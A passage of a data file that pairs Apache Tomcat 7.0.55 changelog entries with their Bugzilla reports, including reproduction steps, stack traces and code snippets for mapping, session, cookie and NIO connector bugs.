4. Refresh page and note creation time stays the same.

5. Click on Invalidate and note that creation time is updated.

On Tomcat 7.0.53 all steps above succeed.
On Tomcat 7.0.54 step 5 fails."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56578
Catalina|Tomcat 7.0.55 (violetagg)|code|56588|Update deprecation of Context.addApplicationListener() methods according to changes in Tomcat 8. (kkolinko)|"ApplicationListener#pluggabilityBlocked field is always ""false"" in Tomcat 8"|"(Noted when reviewing bug 55282 and its fix - r1597855 )

Apart from ~42 references in text code, the o.a.t.util.descriptor.web.ApplicationListener constructor is called in only one place and in that place [1] the pluggabilityBlocked argument is always ""false"".

[1] org.apache.catalina.startup.ContextConfig#configureContext(WebXml)


Originally this feature was added in r1492307 and this the second constructor argument was named ""fromTLD"". The feature is that listeners added by TLD scanning do not have access to all configuration APIs.

In Tomcat 8 Jasper now initializes itself via JasperInitializer.onStartup() and adds TLD listeners via ServletContext.addListener(String) calls.

Thus:
1. I suspect that the feature implemented by r1492307 may be currently broken which means that listeners defined in TLDs have access to full API.

2. ApplicationListener.pluggabilityBlocked field and a bunch of code can be removed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56588
Catalina|Tomcat 7.0.55 (violetagg)|fix|56600|In WebdavServlet: Do not waste time generating response for broken PROPFIND request. (kkolinko)|"Missing ""return"" statements in WebdavServlet.doPropfind()"|"In WebdavServlet.doPropfind() method that handles PROPFIND requests there are two resp.sendError() method calls that are not followed by ""return;"".

It should not cause a visible error, but just some wasted work that generates response that is never sent to the client."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56600
Catalina|Tomcat 7.0.55 (violetagg)|fix||Provide a better error message when asynchronous operations are not supported by a filter or servlet. Patch provided by Romain Manni-Bucau. (violetagg)|||
Catalina|Tomcat 7.0.55 (violetagg)|fix|56606|"User entries in tomcat-users.xml file are recommended to use ""username"" attribute rather than legacy ""name"" attribute. Fix inconsistencies in Windows installer, examples. Update digester rules and documentation for MemoryRealm. (markt/kkolinko)"|Tomcat Installer: old attribute generated in tomcat-users.xml instead of the new one|"Hi all, using the Tomcat Installer (for example apache-tomcat-7.0.42.exe) I see that when the admin user is created (in tomcat-users.xml), the tag inside the xml has the (old?) attribute name instead of username (as seen in other parts in the same file).

I see this in all three source files from tomcat6, 7 and 8, for example here: http://svn.apache.org/repos/asf/tomcat/tc7.0.x/trunk/res/tomcat.nsi

this is the line related:
StrCpy $R5 '<user name=""$R1"" password=""$R2"" roles=""$R3"" />$\r$\n'

so I think the fix should be trivial (change name with username).
Note that even in the published doc in the web site there are some references to <user name=  ...


Last (using the same installation procedure, using the exe), if I don't set a password for the admin, the line in the tomcat-users.xml won't be generated

Thanks for now,
Sandro"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56606
Catalina|Tomcat 7.0.55 (violetagg)|code|56611|Refactor code to remove inefficient calls to Method.isAnnotationPresent(). Based on a patch by Jian Mou. (markt/kkolinko)|No need to call method.isAnnotationPresent() then call method.getAnnotation.|"Created attachment 31702 [details]
org.apache.catalina.core.DefaultInstanceManager

Just call method.getAnnotation(EJB.class) once, since isAnnotationPresent is also implmented by calling getAnnotation. 

java.lang.reflect.AccessibleObject:
    public boolean isAnnotationPresent(
        Class<? extends Annotation> annotationClass) {
        return getAnnotation(annotationClass) != null;
    }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56611
Catalina|Tomcat 7.0.55 (violetagg)|fix|56653|Fix concurrency issue with lists of contexts in Mapper when stopping Contexts. (kkolinko)|Concurrency issue with Mapper$ContextList when stopping Contexts|"I noticed this issue while reviewing the code of Mapper.removeContextVersion() of the current trunk (@1604217). The same code exists in Tomcat 7 and 6.

In Mapper.removeContextVersion() (Mapper.removeContext() in Tomcat 6) it does the following:
[[[
host.contextList.contexts = newContexts;             
// Recalculate nesting                               
host.contextList.nesting = 0;                        
for (int i = 0; i < newContexts.length; i++) {       
    int slashCount = slashCount(newContexts[i].name);
    if (slashCount > host.contextList.nesting) {     
        host.contextList.nesting = slashCount;       
    }                                                
}                                                    
]]]

The problem is there is a delay between when the list of contexts is updated (contextList.contexts) and the contextList.nesting field is updated. The ""nesting"" field is used when mapping contexts.

For example,
1. If there are the following contexts:
ROOT
foo
foo#bar

2. Context foo#bar is being stopped.

3. A request for ""foo"" comes in, e.g. http://localhost/foo/index.html
Expected behaviour: Map the context to foo application.
Actual behaviour:
It may be that the request will be erroneously mapped to the ROOT webapp instead of ""foo"".

I have a test case."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56653
Catalina|Tomcat 7.0.55 (violetagg)|fix|56657|When using parallel deployment, if the same session id matches different versions of a web application, prefer the latest version. Ensure that remapping selects the version that we expect. (kkolinko)|Parallel deployment. If sessionid belongs to the latest version of webapp, use the latest version.|"In 8.0.9, 7.0.54: [1]
Reviewing the loop that finds correct web application version by a sessionid.

Looking at [1], there shall be a ""break;"" after line 921.

This matters in the following rare scenario:
1. There are several versions of the same web application that are deployed in parallel.
2. The same sessionid is valid both for the latest version and for some older one.
3. Expected result: map request to the latest version of the webapp.
Actual result: the latest version will be skipped and the request will be mapped to an older version.


[1] http://svn.apache.org/viewvc/tomcat/tc8.0.x/tags/TOMCAT_8_0_9/java/org/apache/catalina/connector/CoyoteAdapter.java?view=markup#l916"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56657
Catalina|Tomcat 7.0.55 (violetagg)|fix||Assert that mapping result object is empty before performing mapping work in Mapper. (kkolinko)|||
Catalina|Tomcat 7.0.55 (violetagg)|fix|56658|Avoid delay between registrations of mappings for context and for its servlets. (kkolinko)|Concurrency issue with wrapper mappings in Mapper|"When a context starts up, its servlet mappings are registered in a Mapper.

The issue is that MapperListener.registerContext() is implemented as

[[[
        mapper.addContextVersion(...);
        for (Container container : context.findChildren()) {
            registerWrapper((Wrapper) container);
        }
]]]

It registers a context first, then registers it wrappers.  So there is a time slot when the Context have already been registered in the Mapper, but its Wrappers are not yet registered there.  If a request comes it, it can be mapped to a wrong servlet.

In CoyoteAdapter.postParseRequest there is code that protects from this issue when a Context is being reloaded.
- An ""if (request.getContext().getPaused())"" check.

In case if Context is deployed on an already running server, there is no protection.

I think the way to fix this it to amend the Mapper.addContextVersion() method and pass wrapper mappings to it. In this case the Mapper should be create a correct full configuration for a web application at once.

Alternatively, we may change the default value of StandardContext.paused flag to be ""true"" and switch it to ""false"" when the context has already started up.

Alternatively, we may check Context state in CoyoteAdapter.postParseRequest. Can this get rid of the ""started"" flag?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56658
Catalina|Tomcat 7.0.55 (violetagg)|fix|56665|Correct the generation of the effective web.xml when elements contain an empty string as value. (violetagg)|XML schema validation exception for effective web.xml generated for servlet-mapping with empty url-pattern|"I am observing this with the current Tomcat 7 (built from revision 1605072)
If the following 3 conditions are met:
1) Server is running in ""strict compliance"" mode
2) There is a servlet that is mapped to context root using URL pattern """" (empty string) - per Servlet 3.0 mrel spec chapter 12.2 Specification of Mappings

Then whenever Tomcat tries to compile a JSP page, it fails when trying to validate effective merged web.xml against the schema.

WORKAROUND:
To work around the issue I disabled XML validation for this specific context, via <Context xmlValidation=""false""/>

STEPS TO REPRODUCE:
1. Add the following mapping at the end of webapps/examples/WEB-INF/web.xml:
[[[
    <servlet-mapping>
        <servlet-name>RequestInfoExample</servlet-name>
        <url-pattern />
    </servlet-mapping>
]]]

2. Configure Tomcat in ""strict compliance"" mode by adding the following line to conf/catalina.properties:
org.apache.catalina.STRICT_SERVLET_COMPLIANCE=true

3. Purge the work/ directory to remove compiled JSPs, if there are any.
4. Start Tomcat

5. Access http://localhost:8080/examples/
The ""Request Information Example"" page is shown. Thus the empty URL mapping is working correctly.

6. Access a JSP page, http://localhost:8080/examples/jsp/jsp2/el/basic-arithmetic.jsp
Expected: Some arithmetics demo page
Actual: Error 500

HTTP Status 500 - org.apache.jasper.JasperException: XML parsing error on file org.apache.tomcat.util.scan.MergedWebXml: (line 176, col 21)

Stack Trace:
org.apache.jasper.JasperException: org.apache.jasper.JasperException: XML parsing error on file org.apache.tomcat.util.scan.MergedWebXml: (line 176, col 21)
	org.apache.jasper.compiler.JspConfig.processWebDotXml(JspConfig.java:230)
	org.apache.jasper.compiler.JspConfig.init(JspConfig.java:243)
	org.apache.jasper.compiler.JspConfig.findJspProperty(JspConfig.java:302)
	org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:114)
(...)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56665
Catalina|Tomcat 7.0.55 (violetagg)|fix|56666|When clearing the SSO cookie use the same values for domain, path, httpOnly and secure as were used to set the SSO cookie. (markt)|Improve code that clears SSO cookie|"Thread on users@: ""Regarding JSESSIONIDSSO Cookie maintained by tomcat""
http://tomcat.markmail.org/thread/y7m6ceiusm65p5bc

The code for clearing the cookie is in
o.a.catalina.authenticator.SingleSignOn.invoke(...)

[[[
            cookie.setMaxAge(0);
            response.addCookie(cookie);
]]]

The code for setting the cookie is in
o.a.catalina.authenticator.AuthenticatorBase.register(...)


I see the following issues with the code that clears the cookie in SingleSignOn.invoke():

1). The cookie value is echoed back.
To clear a cookie it should be enough to use any fixed value.

(OP concerns are that Secure and HttpOnly flags are not set on the Set-Cookie header. It should not be an issue, as the value is known to be invalid, and as browser is expected to immediately remove the cookie. Still I can agree that it is not pretty).

2) The Domain and Path attributes should have the same values as for a newly created SSO cookie.

(The new cookie replaces the old cookie if it has the same name, domain and path. - RFC 6265 page 24
- Chapter 5.3. Storage Model, item 11)


BTW, an unrelated issue:
The code in SingleSignOn.invoke() operates on the first SSO cookie that it finds. It does not expect browser to send several cookies with this name."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56666
Catalina|Tomcat 7.0.55 (violetagg)|fix|56677|Ensure that HttpServletRequest.getServletContext() returns the correct value during a cross-context dispatch. (markt)|ApplicationHttpRequest does not override javax.servlet.ServletRequestWrapper#getServletContext()|"org.apache.catalina.core.ApplicationHttpRequest does not override one of the Servlet 3.0 APIs, javax.servlet.ServletRequestWrapper#getServletContext().

So ApplicationHttpRequest.getServletContext() does not return its mapped ServletContext in the crossContext situation."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56677
Catalina|Tomcat 7.0.55 (violetagg)|fix|56684|Ensure that Tomcat does not shut down if the socket waiting for the shutdown command experiences a SocketTimeoutException. (markt)|java7: java.net.SocketTimeoutException: Accept timed out|"After upgrading to Java 7, I've noticed some applications fail after about 50 days f (for instance May 8 till June 27). This is suspiciously close to 2 ^ 32 -1 milliseconds:

Jun 27, 2014 9:24:47 AM org.apache.catalina.core.StandardServer await
SEVERE: StandardServer.await: accept:
java.net.SocketTimeoutException: Accept timed out
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.AbstractPlainSocketImpl.accept(AbstractPlainSocketImpl.java:398)
        at java.net.ServerSocket.implAccept(ServerSocket.java:530)
        at java.net.ServerSocket.accept(ServerSocket.java:498)
        at org.apache.catalina.core.StandardServer.await(StandardServer.java:431)
        at org.apache.catalina.startup.Catalina.await(Catalina.java:676)
        at org.apache.catalina.startup.Catalina.start(Catalina.java:628)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:606)
        at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:289)
        at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:414)
Jun 27, 2014 9:24:47 AM org.apache.coyote.http11.Http11AprProtocol pause
INFO: Pausing Coyote HTTP/1.1 on http-51080
Jun 27, 2014 9:24:47 AM org.apache.coyote.ajp.AjpAprProtocol pause
INFO: Pausing Coyote AJP/1.3 on ajp-51009
Jun 27, 2014 9:24:48 AM org.apache.catalina.core.StandardService stop
INFO: Stopping service Catalina

After this, the application is no longer listening.

I suspect this may be due to a change in behavior in Java. See:

$ $JAVA_HOME/bin/java -version
java version ""1.7.0_60""
Java(TM) SE Runtime Environment (build 1.7.0_60-b19)
Java HotSpot(TM) 64-Bit Server VM (build 24.60-b09, mixed mode)

$ strace -f -o /tmp/hh groovy -e 'new ServerSocket(60001, 1, InetAddress.getByName(""localhost"")).accept()'
File contains:
2212  bind(47, {sa_family=AF_INET6, sin6_port=htons(60001), inet_pton(AF_INET6, ""::ffff:127.0.0.1"", &sin6_addr), sin6_flowinfo=0, sin6_scope_id=0}, 28) = 0
2212  listen(47, 1)                     = 0
2212  poll([{fd=47, events=POLLIN|POLLERR}], 1, 4294967295 <unfinished ...>

$ $JAVA_HOME/bin/java -version
java version ""1.6.0_45""
Java(TM) SE Runtime Environment (build 1.6.0_45-b06)
Java HotSpot(TM) 64-Bit Server VM (build 20.45-b01, mixed mode)

2661  bind(46, {sa_family=AF_INET6, sin6_port=htons(60001), inet_pton(AF_INET6, ""::ffff:127.0.0.1"", &sin6_addr), sin6_flowinfo=0, sin6_scope_id=0}, 28) = 0
2661  listen(46, 1)                     = 0
2661  accept(46,  <unfinished ...>

While java6 calls accept(), java7 first waits for an event on the socket with poll(). However, it uses a timeout of 4294967295 milliseconds."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56684
Catalina|Tomcat 7.0.55 (violetagg)|fix||When the current PathInfo is modified as a result of dispatching a request, ensure that a call to HttpServletRequest.getPathTranslated() returns a value that is based on the modified PathInfo. (markt)|||
Catalina|Tomcat 7.0.55 (violetagg)|fix|56698|When persisting idle sessions, only persist newly idle sessions. Patch provided by Felix Schumacher. (markt)|Sessions will be backed up too often by PersistentManager|"Created attachment 31793 [details]
Add a flag to PersistentManager whether it will save idle sessions once or always

The PersistentManager will save every Session which has not been accessed since maxIdleBackup time on every round.

The attached patch will introduce a flag, so that the admin can decide whether he wants to have the old behaviour, or the more efficient one of only saving sessions once, when they were accessed and idle for maxIdleBackup.

The patch gets a lot simpler, if we just change the behaviour and declare the old one as a bug :)

Tomcat 7 has the same problem and I could provide a patch for it, too."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56698
Catalina|Tomcat 7.0.55 (violetagg)|fix|56710|Do not map requests to servlets when context is being reloaded. (kkolinko)|IllegalStateException: The resources may not be accessed during webapp reload|"I encountered this while testing 8.0.10 release candidate while investigating bug 56658 regression.

Steps to reproduce - see Comment 3 in bug 56658, but skip step 4,
https://issues.apache.org/bugzilla/show_bug.cgi?id=56658#c3

That is: cause reload of the examples webapp, but ask for ""index.html"" while reloading has not been completed yet.

Expected: The request shall wait for web application reload to complete and then display the page (or error 404 in case of that bug that I was investigating). There is a loop in CoyoteAdapter that waits while context is being reloaded.

Actual: A blank page is rendered, and an IllegalStateException is logged.

A snippet from catalina.2014-07-11.log:
[[[
11-Jul-2014 00:45:08.124 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.startup.HostConfig.reload Reloading context [/examples]
11-Jul-2014 00:45:08.125 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.core.StandardContext.reload Reloading Context with name [/examples] has started
11-Jul-2014 00:45:08.164 SEVERE [http-nio-8080-exec-1] org.apache.coyote.http11.AbstractHttp11Processor.process Error processing request
 java.lang.IllegalStateException: The resources may not be accessed if they are not currently started
	at org.apache.catalina.webresources.StandardRoot.validate(StandardRoot.java:245)
	at org.apache.catalina.webresources.StandardRoot.getResource(StandardRoot.java:212)
	at org.apache.catalina.webresources.StandardRoot.getResource(StandardRoot.java:206)
	at org.apache.catalina.mapper.Mapper.internalMapWrapper(Mapper.java:946)
	at org.apache.catalina.mapper.Mapper.internalMap(Mapper.java:765)
	at org.apache.catalina.mapper.Mapper.map(Mapper.java:635)
	at org.apache.catalina.connector.CoyoteAdapter.postParseRequest(CoyoteAdapter.java:861)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:521)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1078)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:658)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:222)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1566)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1523)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)

11-Jul-2014 00:45:09.007 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.core.StandardContext.reload Reloading Context with name [/examples] is completed
]]]

A snippet from localhost.2014-07-11.log:
[[[
127.0.0.1 - - [11/Jul/2014:00:44:10 +0400] ""GET /examples/index.html HTTP/1.1"" 200 1156
127.0.0.1 - - [11/Jul/2014:00:44:21 +0400] ""GET /examples/index.html HTTP/1.1"" 304 -
127.0.0.1 - - [11/Jul/2014:00:44:21 +0400] ""GET /favicon.ico HTTP/1.1"" 304 -
127.0.0.1 - - [11/Jul/2014:00:44:24 +0400] ""GET /examples/index.html HTTP/1.1"" 304 -
127.0.0.1 - - [11/Jul/2014:00:44:50 +0400] ""GET /examples/index.html HTTP/1.1"" 404 1000
127.0.0.1 - - [11/Jul/2014:00:44:50 +0400] ""GET /favicon.ico HTTP/1.1"" 304 -
127.0.0.1 - - [11/Jul/2014:00:45:08 +0400] ""GET /examples/index.html HTTP/1.1"" 500 -
127.0.0.1 - - [11/Jul/2014:00:45:11 +0400] ""GET /examples/index.html HTTP/1.1"" 404 1000
127.0.0.1 - - [11/Jul/2014:00:45:16 +0400] ""GET /examples/index.html HTTP/1.1"" 404 1000
]]]

The 404 are from the bug that I was investigating. The 500 is from this bug.

I was running with jpda debugging enabled, so webapp reload was a bit slower than usual."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56710
Catalina|Tomcat 7.0.55 (violetagg)|fix|56712|Fix session idle time calculations in PersistenceManager. (kkolinko)|Off-by-one second errors in time calculations in PersistenceManager|"The fix for bug 56698 (r1608443, r1608448) implemented an automated test for PersistenceManager. Reviewing the manager code to investigate the test failures, I see two issues:

Checks that evaluate idle time of a session in PersistenceManagerBase typically do the following:

> int timeIdle = (int) (session.getIdleTime() / 1000L);
> if (timeIdle > maxIdleBackup) { ... }

I see two errors in those two lines:

Error 1.
----
The integer division performs truncation. Comparing the code with documentation, the condition there shall be

> if (timeIdle >= maxIdleBackup) { ... }

It does no matter much for a real-world configuration where the times are expected to be tens of seconds, but it matters for the test case that wants to run fast.

Error 2.
----
StandardSession.getIdleTime() performs a validity check and can throw an ISE which is unexpected here. It shall be replaced with a call to session.getIdleTimeInternal()."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56712
Catalina|Tomcat 7.0.55 (violetagg)|fix|56717|Fix duplicate registration of MapperListener during repeated starts of embedded Tomcat. (kkolinko)|MapperListener does not remove its listeners. It matters for repeated starts of embedded Tomcat,|"Debugged om the current trunk at 1610244, between 8.0.10 and 8.0.11.
Steps to reproduce:
1. Add the following lines to build.properties
test.entry=org.apache.catalina.core.TestStandardContext
test.entry.methods=testFlagFailCtxIfServletStartFails

2. I added log.info(""..."", new RuntimeException()) to Mapper.addHost(), Mapper.removeHost()

3. Run the test case.

The test case performs ""tomcat.stop(); tomcat.start();"" twice.

Actual behaviour:
During the second tomcat.start() the Mapper.addHost() is called twice with the same host. It results in an error message,

> SEVERE [main] org.apache.catalina.mapper.Mapper.addHost Duplicate Host [localhost]. The name is already used by Host [localhost]. This Host will be ignored.

Expected behaviour:
No such message.

From debug stacktraces that I printed in addHost(), I see that during the second start the two addHost() calls have the following stack traces:
[[[
 java.lang.RuntimeException
	at org.apache.catalina.mapper.Mapper.addHost(Mapper.java:95)
	at org.apache.catalina.mapper.MapperListener.registerHost(MapperListener.java:295)
	at org.apache.catalina.mapper.MapperListener.lifecycleEvent(MapperListener.java:482)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:168)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1396)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1386)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:745)

]]]
and
[[[
 java.lang.RuntimeException
	at org.apache.catalina.mapper.Mapper.addHost(Mapper.java:95)
	at org.apache.catalina.mapper.MapperListener.registerHost(MapperListener.java:295)
	at org.apache.catalina.mapper.MapperListener.startInternal(MapperListener.java:110)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.StandardService.startInternal(StandardService.java:450)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:760)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.startup.Tomcat.start(Tomcat.java:340)
	at org.apache.catalina.startup.TomcatBaseTest$TomcatWithFastSessionIDs.start(TomcatBaseTest.java:410)
	at org.apache.catalina.core.TestStandardContext.testFlagFailCtxIfServletStartFails(TestStandardContext.java:917)
(... JUnit code...)
]]]

The second stack trace with ""MapperListener.startInternal()"" is the expected one. The same stack trace is observed during the first tomcat.start().

The first stack trace with ""MapperListener.lifecycleEvent()"" is an unexpected one. It is caused by the lifecycle listener still being registered on Host.

The MapperListener.startInternal() method contains line
> addListeners(engine);

As listeners are stored in a list, it means that the same listener will be added the second time. I expect that if one adds the thirds tomcat.start() call to the test case, it will cause Mapper.addHost() to be called three times.


That said, I think there is not much of a problem from calling addHost() more than once for the same host (e.g. Mapper.addContextVersion() may call it silently). Thus I'll change Mapper.addHost() to do not treat such repeated calls as an error."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56717
Catalina|Tomcat 7.0.55 (violetagg)|add|56724|Write an error message to Tomcat logs if container background thread is aborted unexpectedly. (kkolinko)|Restart Container background thread if it died unexpectedly|"To address the issue that has been raised several times on the mailing lists, e.g.

http://tomcat.markmail.org/thread/xooxcq56ehki63dh
""ContainerBackgroundProcessor and compounding OOMEs""

http://tomcat.markmail.org/thread/f6b6vicg7kusckra
""Background thread died; no errors in log; invoking backgroundProcess via JMX has no effect""

I think it is OK to start a new background thread after some delay. If the start succeeds, it will be a new thread with its own (clean) stack.

It may help for StackOverflowError.
It might partially help with OutOfMemoryError thread death if nothing else is available, but a better strategy for an admin to handle an OutOfMemoryError is to start JVM with -XX:OnOutOfMemoryError flag with a script that shuts down (and restarts) Tomcat."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56724
Coyote|Tomcat 7.0.55 (violetagg)|fix|56518|When using NIO, do not attempt to write to the socket if the thread is marked interrupted as this will lead to a connection limit leak. This fix was based on analysis of the issue by hanyong. (markt)|NIO async servlet limit latch leak|"Created attachment 31613 [details]
the sample webapp to reproduce the bug

we have encouter this bug in a real product webapp.

I have tested this in linux x86, oracle jdk jdk1.7.0_55, tomcat 7.0.53 and tomcat 8.0.5.

CONFIG:
we change HTTP Connector to NIO in ""server.xml"", 
e.g. protocol=""org.apache.coyote.http11.Http11NioProtocol""

WEBAPP LOGIC:
the simplified situation:
1. call ""req.startAsync()"" to start async serlvet, then execute the async logic in our user thread.
2. sometimes the user thread be interrupted (by some timeout logic of our code).
3. some user code call ""resp.flushBuffer()"" to send response to client

PROBLEM:
in the situation descibed above, the ""LimitLatch.countDown()"" is not called.
when the connections limit latch count up to max ( default ""10000"" ),
tomcat DO not accept any connection, all incoming client hangs.

REPRODUCER:

in a clean tomcat-7.0.53 installation:
1. change the default ""server.xml"" Connector config.
(1) change protocol=""org.apache.coyote.http11.Http11NioProtocol""
(2) Optional, add maxConnections=""100"" to reproduce the bug faster.
2. copy the sample webapp in the attachment to ""webapps/ROOT.war""
3. start tomcat.
4. make plenty request to ""/async.html"", 

for (( i = 0; i < 15000; ++i )) ; do echo $i; curl localhost:8080/async.html; done

each request is likely cause a limit latch leak.
when the requests reaches maxConnections (100 as we set above) or some more,
the client ( curl ) hangs.

TECHNIC-DETAILS:
after some debug, wo found these:

1. when the thread was interrupted, when the user code call ""resp.flushBuffer()"",
the NioChannel was Closed by jdk NIO code, and a ClosedByInterruptException is thrown.

2. when the channel closed, the SelectionKey was removed by Poller thread, 
stack trace:
Daemon Thread [http-nio-8080-ClientPoller-0] (Suspended)	
	owns: Object  (id=3346)	
	owns: HashSet<E>  (id=3354)	
	owns: EPollSelectorImpl  (id=82)	
	owns: Collections$UnmodifiableSet<E>  (id=3355)	
	owns: Util$2  (id=3356)	
	SocketChannelImpl(AbstractSelectableChannel).removeKey(SelectionKey) line: 114	
	EPollSelectorImpl(AbstractSelector).deregister(AbstractSelectionKey) line: 168	
	EPollSelectorImpl.implDereg(SelectionKeyImpl) line: 162	
	EPollSelectorImpl(SelectorImpl).processDeregisterQueue() line: 131	
	EPollSelectorImpl.doSelect(long) line: 69	
	EPollSelectorImpl(SelectorImpl).lockAndDoSelect(long) line: 69	
	EPollSelectorImpl(SelectorImpl).select(long) line: 80	
	NioEndpoint$Poller.run() line: 1163	
	Thread.run() line: 662	

3. when we call ""ctx.complete()"", it run to ""org.apache.tomcat.util.net.NioEndpoint.processSocket(NioChannel, SocketStatus, boolean)"", code is below:

    public boolean processSocket(NioChannel socket, SocketStatus status, boolean dispatch) {
        try {
            KeyAttachment attachment = (KeyAttachment)socket.getAttachment(false);
            if (attachment == null) {
                return false;
            }

since the SelectionKey was removed, the ""attachment"" returns null.
the logic is break, ""AbstractEndpoint.countDownConnection()"" is not called, a limit latch leak happens.

WORK-AROUND:
some work-around:
1. switch to the stable BIO connector.
2. avoid call ""resp.flushBuffer()"" in the user thread."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56518
Coyote|Tomcat 7.0.55 (violetagg)|fix|56521|Re-use the asynchronous write buffer between writes to reduce allocation and GC overhead. Based on a patch by leonzhx. Also make the buffer size configurable and remove copying of data within buffer when the buffer is only partially written on a subsequent write. (markt)|Reuse the output buffer in AbstractServletOutputStream|"Created attachment 31618 [details]
diff file of"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56521
Coyote|Tomcat 7.0.55 (violetagg)|fix||Correct a copy/paste error and return a 500 response rather than a 400 response when an internal server error occurs on early stages of request processing. (markt)|||
Coyote|Tomcat 7.0.55 (violetagg)|code|56582|"Use switch(actionCode) in processors instead of a chain of ""elseif""s. (kkolinko)"|Use switch(enum) in implementations of ActionHook.action(ActionCode, ...)|"As of now,
AbstractHttp11Processor.action(ActionCode, Object)
AbstractAjpProcessor.action(ActionCode, Object)

are implemented as a chain of if/elseif going through every defined ActionCode.

As ActionCode is an enum starting with Tomcat 7, I think it would be better to reorganize the code to use switch(enum) construct."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56582
Coyote|Tomcat 7.0.55 (violetagg)|fix||Fix CVE-2014-0227: Various improvements to ChunkedInputFilter including clean-up, i18n for error messages and adding an error flag to allow subsequent attempts at reading after an error to fail fast. (markt)|||
Coyote|Tomcat 7.0.55 (violetagg)|fix||If request contains an unrecognized Expect header, respond with error 417 (Expectation Failed), according to RFC2616 chapter 14.20. (markt)|||
Coyote|Tomcat 7.0.55 (violetagg)|fix||When an error occurs after the response has been committed close the connection immediately rather than attempting to finish the response to make it easier for the client to differentiate between a complete response and one that failed part way though. (markt)|||
Coyote|Tomcat 7.0.55 (violetagg)|fix|56620|Avoid bogus access log entries when pausing the NIO HTTP connector and ensure that access log entries generated by error conditions use the correct request start time. (markt)|Bogus access log entries with status 503 and date in year 1970 (the epoch) when pausing NIO connector|"This issue is reproducible with the current trunk (@1602359),
plus I added the following lines to AbstractAccessLogValve.log() after line 630, to help me debug this issue:
[[[
         long start = request.getCoyoteRequest().getStartTime();
+        if (start == -1) {
+            // Request processing has not started yet
+            log.warn(""Unexpected timestamp"", new Throwable());
+        }
         Date date = getDate(start + time);
]]]

To reproduce, run ""org.apache.jasper.compiler.TestGenerator"" test with access log being enabled. Run it with NIO connector. I use the following configuration in build.properties:
[[[
test.accesslog=true
test.entry=org.apache.jasper.compiler.TestGenerator
]]]

Depending on your luck, there will be one or several of the following lines in access_log.$DATE file produced by the tests:
[[[
127.0.0.1 - - [01/Jan/1970:02:59:59 +0300] ""-"" 503 - null 0
]]]

The entry is bogus, as in this particular test there is one request per test asking for a JSP page. Those requests are processed and properly logged.

Thanks to the log.warn patch above it logs the following stacktrace:
[[[
13-Jun-2014 15:01:37.441 WARNING [http-nio-127.0.0.1-auto-2-exec-1] org.apache.catalina.valves.AbstractAccessLogValve.log Unexpected timestamp
 java.lang.Throwable
	at org.apache.catalina.valves.AbstractAccessLogValve.log(AbstractAccessLogValve.java:633)
	at org.apache.catalina.core.AccessLogAdapter.log(AccessLogAdapter.java:51)
	at org.apache.catalina.core.StandardEngine.logAccess(StandardEngine.java:342)
	at org.apache.catalina.connector.CoyoteAdapter.log(CoyoteAdapter.java:674)
	at org.apache.coyote.http11.Http11NioProcessor.handleIncompleteRequestLineRead(Http11NioProcessor.java:240)
